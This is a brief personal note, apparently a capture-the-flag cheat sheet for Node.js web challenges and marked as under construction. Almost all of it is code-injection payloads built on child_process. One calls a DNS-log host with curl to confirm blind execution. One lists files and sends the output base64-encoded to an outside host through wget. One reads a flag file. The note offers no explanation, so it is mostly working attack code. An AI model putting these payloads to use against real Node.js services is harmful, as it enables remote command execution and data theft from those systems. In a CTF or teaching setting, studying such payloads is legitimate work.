-
- tags:: [[CTFWEB/NodeJS]]
-
- # 施工中
	- ```js
	  require("child_process").spawn("curl", ["52s3km.dnslog.cn"]);
	  ```
	- ```js
	  require("child_process").spawn("ls", ["-la"]).stdout.on("data", data => {
	      require("child_process").spawn("wget", ["ca.xxx.xyz:3003", "--post-data", btoa(data)]);
	  });
	  ```
	- ```js
	  require("child_process").spawnSync(
	    'cat',
	    ['fl001g.txt']
	  ).stdout.toString()
	  
	  ```